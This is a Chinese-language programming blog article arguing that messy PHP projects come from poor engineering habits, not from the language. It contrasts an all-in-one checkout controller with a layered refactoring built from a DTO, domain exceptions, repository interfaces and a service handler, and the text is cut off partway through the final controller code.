                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">PHP 的问题不在语言本身，而在我们怎么写它</h2>
<p>代码库烂了不是语言的锅，是赶工和惯性。</p>
<p>PHP 的口碑，几乎在每次技术讨论中都会被拎出来。应用慢、乱、不安全、改起来痛苦？总有人耸耸肩说："嗯……毕竟是 PHP 嘛。"</p>
<p>这话很少出于技术判断，更像是一种习惯性甩锅。</p>
<p>事实比这简单，也更扎心：大多数 PHP 系统之所以难维护，是我们自己放任的结果。PHP 不会一上来就逼你做架构设计、划边界、守规矩。它很宽容，很务实，特别擅长让你把一个“能跑就行”的东西赶出来。</p>
<p>但今天能跑的代码库，明天可能就是灾难。</p>
<p>一个 PHP 项目沦为恐怖故事，很少是因为 PHP 做不到更好，而是团队从来没养成那些能让项目越做越大还不崩的习惯——结构、测试、约定、关注点分离。</p>
<p>现代 PHP 完全有能力做到：</p>
<ul>
<li>严格类型（是的，真正的类型）</li>
<li>整洁架构</li>
<li>依赖注入</li>
<li>表达力强的领域模型</li>
<li>规范的错误处理</li>
<li>可靠的测试</li>
<li>高性能（OPcache/JIT、缓存、合理的 I/O）</li>
<li>成熟的工具链</li>
</ul>
<p>如果你对 PHP 的印象还停留在"到处 include 文件"和"在视图里写 SQL"，那你骂的不是 PHP 这门语言，而是一种早该被淘汰的 PHP 写法。</p>
<p>这篇文章不是在给 PHP 洗地，只是想说清楚一件事：PHP 是一面镜子，照出来的是你的工程文化。照出来不好看，换面镜子也没用。</p>
<h3 data-id="heading-1">PHP 很宽容——宽容的语言会放大你的习惯</h3>
<p>有些语言生态从一开始就逼你把结构搭好。想做稍微复杂一点的东西，就绕不开包、模块、接口、依赖注入这些概念，哪怕你没主动要求，约束也自动就在那了。</p>
<p>PHP 的玩法不一样：</p>
<ul>
<li>可以从一个文件起步</li>
<li>可以毫无阻力地混合各层</li>
<li>可以在任何地方访问全局变量</li>
<li>可以在控制器里直接查数据库</li>
<li>可以忽略类型照样上线</li>
</ul>
<p>这种灵活性本身不是坏事，PHP 靠它当了多年 Web 开发的默认选择。但它也埋了一个坑：结构显得可有可无，而可有可无的东西在赶工时一定会被砍掉。</p>
<p>很多“PHP 太烂了”的故事，背后的真实剧情是“赶工期上了线，然后重构的债一直没还”。</p>
<p>PHP 没有造成这个问题，它只是没有阻止。</p>
<h3 data-id="heading-2">"都怪 PHP"往往是在逃避责任</h3>
<p>系统让人痛苦的时候，甩锅给语言最省事，因为语言最容易看到。真正的原因往往藏得更深：</p>
<ul>
<li>没有统一的编码规范</li>
<li>没有架构负责人</li>
<li>没有测试</li>
<li>没有为重构分配时间</li>
<li>代码评审时松时紧</li>
<li>"先交付再说"的激励机制</li>
</ul>
<p>这些问题哪个技术栈都有。区别在于 PHP 能让你在几乎没有约束的情况下把项目推得很远，技术债悄悄攒着——然后在某一天集中爆发。</p>
<p>PHP 成了替罪羊，因为承认流程烂了，比甩锅给语言难多了。</p>
<h3 data-id="heading-3">现代 PHP 不是你记忆中的 PHP</h3>
<p>如果你对 PHP 的认知还停在"PHP 5 加一堆随意 include"的年代，那你错过的东西太多了：</p>
<ul>
<li><code>declare(strict_types=1);</code></li>
<li>标量类型和返回类型</li>
<li>类型化属性</li>
<li>联合类型</li>
<li>枚举</li>
<li>属性注解（Attributes）</li>
<li>更好的错误语义</li>
<li>Composer 成为标配</li>
<li>PSR 标准</li>
<li>优秀的框架（Laravel、Symfony）和组件</li>
<li>静态分析工具（PHPStan/Psalm）</li>
<li>代码格式化工具（PHP-CS-Fixer）</li>
<li>容器化 / CI 工作流</li>
</ul>
<p>语言进化了，但很多团队没有。</p>
<p>所以真正的问题是：你写 PHP 的时候，是把它当成一门现代后端语言，还是当成赶工时凑合用的脚本？</p>
<h3 data-id="heading-4">经典 PHP 反模式："什么都塞进控制器"</h3>
<p>下面这套流程，在很多项目里都能看到：</p>
<ol>
<li>控制器接收请求</li>
<li>控制器做验证</li>
<li>控制器拼查询</li>
<li>控制器处理业务规则</li>
<li>控制器更新数据库</li>
<li>控制器格式化响应</li>
<li>控制器触发副作用（邮件、队列）</li>
</ol>
<p>能跑，能上线，功能还能往上堆。然后就开始变脆——因为控制器已经变成了一个揽了业务规则、数据持久化和 I/O 的上帝对象。</p>
<p>看一个简化版的例子。</p>
<h4 data-id="heading-5">❌ 反模式：所有逻辑塞在控制器里</h4>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckoutController</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">placeOrder</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$request</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-variable">$userId</span> = (<span class="hljs-keyword">int</span>)(<span class="hljs-variable">$request</span>[<span class="hljs-string">'user_id'</span>] ?? <span class="hljs-number">0</span>);
        <span class="hljs-variable">$items</span>  = <span class="hljs-variable">$request</span>[<span class="hljs-string">'items'</span>] ?? [];
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$userId</span> &lt;= <span class="hljs-number">0</span> || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$items</span>)) {
            <span class="hljs-keyword">return</span> [<span class="hljs-string">'ok'</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">'error'</span> =&gt; <span class="hljs-string">'Invalid request'</span>];
        }
        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$_ENV</span>[<span class="hljs-string">'DB_DSN'</span>], <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">'DB_USER'</span>], <span class="hljs-variable">$_ENV</span>[<span class="hljs-string">'DB_PASS'</span>]);
        <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">beginTransaction</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// Load user</span>
            <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"SELECT id, status FROM users WHERE id = ?"</span>);
            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-variable">$userId</span>]);
            <span class="hljs-variable">$user</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);
            <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$user</span> || <span class="hljs-variable">$user</span>[<span class="hljs-string">'status'</span>] !== <span class="hljs-string">'active'</span>) {
                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">"User not active"</span>);
            }
            <span class="hljs-comment">// Calculate total</span>
            <span class="hljs-variable">$total</span> = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$items</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$it</span>) {
                <span class="hljs-variable">$productId</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$it</span>[<span class="hljs-string">'product_id'</span>];
                <span class="hljs-variable">$qty</span>       = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$it</span>[<span class="hljs-string">'qty'</span>];
                <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"SELECT id, price, stock FROM products WHERE id = ?"</span>);
                <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-variable">$productId</span>]);
                <span class="hljs-variable">$product</span> = <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">fetch</span>(PDO::<span class="hljs-variable constant_">FETCH_ASSOC</span>);
                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$product</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">"Product not found"</span>);
                }
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$qty</span> &lt;= <span class="hljs-number">0</span> || <span class="hljs-variable">$qty</span> &gt; (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$product</span>[<span class="hljs-string">'stock'</span>]) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">RuntimeException</span>(<span class="hljs-string">"Insufficient stock"</span>);
                }
                <span class="hljs-variable">$total</span> += ((<span class="hljs-keyword">int</span>)<span class="hljs-variable">$product</span>[<span class="hljs-string">'price'</span>]) * <span class="hljs-variable">$qty</span>;
                <span class="hljs-comment">// Reduce stock inline</span>
                <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"UPDATE products SET stock = stock - ? WHERE id = ?"</span>);
                <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-variable">$qty</span>, <span class="hljs-variable">$productId</span>]);
            }
            <span class="hljs-comment">// Insert order</span>
            <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"INSERT INTO orders(user_id, total, created_at) VALUES(?, ?, NOW())"</span>);
            <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-variable">$userId</span>, <span class="hljs-variable">$total</span>]);
            <span class="hljs-variable">$orderId</span> = (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">lastInsertId</span>();
            <span class="hljs-comment">// Insert items</span>
            <span class="hljs-variable">$stmt</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-string">"INSERT INTO order_items(order_id, product_id, qty) VALUES(?, ?, ?)"</span>);
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$items</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$it</span>) {
                <span class="hljs-variable">$stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>([<span class="hljs-variable">$orderId</span>, (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$it</span>[<span class="hljs-string">'product_id'</span>], (<span class="hljs-keyword">int</span>)<span class="hljs-variable">$it</span>[<span class="hljs-string">'qty'</span>]]);
            }
            <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">commit</span>();
            <span class="hljs-keyword">return</span> [<span class="hljs-string">'ok'</span> =&gt; <span class="hljs-literal">true</span>, <span class="hljs-string">'order_id'</span> =&gt; <span class="hljs-variable">$orderId</span>, <span class="hljs-string">'total'</span> =&gt; <span class="hljs-variable">$total</span>];
        } <span class="hljs-keyword">catch</span> (<span class="hljs-built_in">Throwable</span> <span class="hljs-variable">$e</span>) {
            <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">rollBack</span>();
            <span class="hljs-keyword">return</span> [<span class="hljs-string">'ok'</span> =&gt; <span class="hljs-literal">false</span>, <span class="hljs-string">'error'</span> =&gt; <span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>()];
        }
    }
}
</code></pre>
<p>这段代码烂，不是因为它用 PHP 写的，而是因为它把这些东西全搅在了一起：</p>
<ul>
<li>输入验证</li>
<li>事务管理</li>
<li>业务规则</li>
<li>持久化</li>
<li>状态变更</li>
<li>响应格式化</li>
</ul>
<p>不连数据库就没法测业务逻辑，不复制代码就没法复用规则，改一个小地方都提心吊胆。</p>
<p>如果你平时见到的 PHP 都长这样，有偏见很正常。但话说回来，PHP 没逼你写成这样——我们自己选的这条路，图的就是快。</p>
<h3 data-id="heading-6">"好的 PHP"长什么样：无聊的结构，清晰的边界</h3>
<p>写得好的 PHP 代码往往看起来"没什么技术含量"。这不是坏事——无聊的代码就是可预测的代码。</p>
<p>更合理的分层方式是：</p>
<ul>
<li>控制器只处理 HTTP 层（请求/响应）</li>
<li>应用/服务层协调用例</li>
<li>领域对象负责维护业务不变量</li>
<li>仓储层处理持久化</li>
<li>副作用通过接口隔离</li>
</ul>
<p>下面用更清晰的结构重写同一个功能。</p>
<h4 data-id="heading-7">✅ 现代 PHP "用例"风格</h4>
<p>下面的代码尽量精简——不绑定特定框架，但和 Laravel/Symfony 的写法兼容。</p>
<p><strong>Step A：定义请求 DTO</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlaceOrderCommand</span>
</span>{
    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@param</span> array&lt;int, array{productId:int, qty:int}&gt; $items
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$userId</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">array</span> <span class="hljs-variable">$items</span>
    </span>) </span>{}
}
</code></pre>
<p><strong>Step B：定义领域异常（业务错误不应该是 500）</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DomainException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">RuntimeException</span> </span>{}
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserNotActive</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DomainException</span> </span>{}
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductNotFound</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DomainException</span> </span>{}
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InsufficientStock</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DomainException</span> </span>{}
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">InvalidOrder</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DomainException</span> </span>{}
</code></pre>
<p><strong>Step C：为依赖定义小接口</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserRepository</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getStatus</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$userId</span></span>): ?<span class="hljs-title">string</span></span>;
}
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ProductSnapshot</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$id</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$price</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$stock</span>
    </span>) </span>{}
}
<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProductRepository</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getSnapshot</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$productId</span></span>): ?<span class="hljs-title">ProductSnapshot</span></span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decreaseStock</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$productId</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$qty</span></span>): <span class="hljs-title">void</span></span>;
}
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">OrderResult</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$orderId</span>,
        <span class="hljs-keyword">public</span> <span class="hljs-keyword">readonly</span> <span class="hljs-keyword">int</span> <span class="hljs-variable">$total</span>
    </span>) </span>{}
}
<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">OrderRepository</span>
</span>{
    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@param</span> array&lt;int, array{productId:int, qty:int, price:int}&gt; $lines
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">create</span>(<span class="hljs-params"><span class="hljs-keyword">int</span> <span class="hljs-variable">$userId</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$total</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$lines</span></span>): <span class="hljs-title">int</span></span>;
}
<span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">TransactionManager</span>
</span>{
    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@template</span> T
     * <span class="hljs-doctag">@param</span> callable():T $fn
     * <span class="hljs-doctag">@return</span> T
     */</span>
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"><span class="hljs-keyword">callable</span> <span class="hljs-variable">$fn</span></span>): <span class="hljs-title">mixed</span></span>;
}
</code></pre>
<p><strong>Step D：实现用例（服务层）</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PlaceOrderHandler</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params">
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> TransactionManager <span class="hljs-variable">$tx</span>,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> UserRepository <span class="hljs-variable">$users</span>,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> ProductRepository <span class="hljs-variable">$products</span>,
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> OrderRepository <span class="hljs-variable">$orders</span>
    </span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handle</span>(<span class="hljs-params">PlaceOrderCommand <span class="hljs-variable">$cmd</span></span>): <span class="hljs-title">OrderResult</span>
    </span>{
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$cmd</span>-&gt;userId &lt;= <span class="hljs-number">0</span> || <span class="hljs-variable">$cmd</span>-&gt;items === []) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidOrder</span>(<span class="hljs-string">"User and items are required."</span>);
        }
        <span class="hljs-variable">$status</span> = <span class="hljs-variable language_">$this</span>-&gt;users-&gt;<span class="hljs-title function_ invoke__">getStatus</span>(<span class="hljs-variable">$cmd</span>-&gt;userId);
        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$status</span> !== <span class="hljs-string">'active'</span>) {
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserNotActive</span>(<span class="hljs-string">"User is not active."</span>);
        }
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;tx-&gt;<span class="hljs-title function_ invoke__">run</span>(function () <span class="hljs-keyword">use</span> ($<span class="hljs-title">cmd</span>): <span class="hljs-title">OrderResult</span> {
            $<span class="hljs-title">lines</span> = [];
            <span class="hljs-variable">$total</span> = <span class="hljs-number">0</span>;
            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$cmd</span>-&gt;items <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) {
                <span class="hljs-variable">$productId</span> = <span class="hljs-variable">$item</span>[<span class="hljs-string">'productId'</span>];
                <span class="hljs-variable">$qty</span>       = <span class="hljs-variable">$item</span>[<span class="hljs-string">'qty'</span>];
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$qty</span> &lt;= <span class="hljs-number">0</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvalidOrder</span>(<span class="hljs-string">"Quantity must be &gt; 0."</span>);
                }
                <span class="hljs-variable">$snapshot</span> = <span class="hljs-variable language_">$this</span>-&gt;products-&gt;<span class="hljs-title function_ invoke__">getSnapshot</span>(<span class="hljs-variable">$productId</span>);
                <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$snapshot</span>) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductNotFound</span>(<span class="hljs-string">"Product <span class="hljs-subst">{$productId}</span> not found."</span>);
                }
                <span class="hljs-keyword">if</span> (<span class="hljs-variable">$qty</span> &gt; <span class="hljs-variable">$snapshot</span>-&gt;stock) {
                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InsufficientStock</span>(<span class="hljs-string">"Insufficient stock for <span class="hljs-subst">{$productId}</span>."</span>);
                }
                <span class="hljs-variable">$lineTotal</span> = <span class="hljs-variable">$snapshot</span>-&gt;price * <span class="hljs-variable">$qty</span>;
                <span class="hljs-variable">$total</span> += <span class="hljs-variable">$lineTotal</span>;
                <span class="hljs-comment">// Reserve/update stock</span>
                <span class="hljs-variable language_">$this</span>-&gt;products-&gt;<span class="hljs-title function_ invoke__">decreaseStock</span>(<span class="hljs-variable">$productId</span>, <span class="hljs-variable">$qty</span>);
                <span class="hljs-variable">$lines</span>[] = [
                    <span class="hljs-string">'productId'</span> =&gt; <span class="hljs-variable">$productId</span>,
                    <span class="hljs-string">'qty'</span>       =&gt; <span class="hljs-variable">$qty</span>,
                    <span class="hljs-string">'price'</span>     =&gt; <span class="hljs-variable">$snapshot</span>-&gt;price,
                ];
            }
            <span class="hljs-variable">$orderId</span> = <span class="hljs-variable language_">$this</span>-&gt;orders-&gt;<span class="hljs-title function_ invoke__">create</span>(<span class="hljs-variable">$cmd</span>-&gt;userId, <span class="hljs-variable">$total</span>, <span class="hljs-variable">$lines</span>);
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderResult</span>(<span class="hljs-variable">$orderId</span>, <span class="hljs-variable">$total</span>);
        });
    }
}
</code></pre>
<p><strong>Step E：控制器变得轻薄且可测试</strong></p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">declare</span>(strict_types=<span class="hljs-number">1</span>);
<span class="hljs-keyword">final</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CheckoutController</span>
</span>{
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-keyword">private</span> <span class="hljs-keyword">readonly</span> PlaceOrderHandler <span class="hljs-variable">$handler</span></span>) </span>{}
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">placeOrder</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$request</span></span>): <span class="hljs-title">array</span>
    </span>{
        <span class="hljs-keyword">try</span> {
            <span class="hljs-variable">$itemsRaw</span> = <span class="hljs-variable">$request</span>[<span class="hljs-string">'items'</span>] ?? [];
            <span class="hljs-variable">$items</span> = <span class="hljs-title function_ invoke__">array_map</span>(
                fn(<span class="hljs-variable">$it</span>) =&gt; [
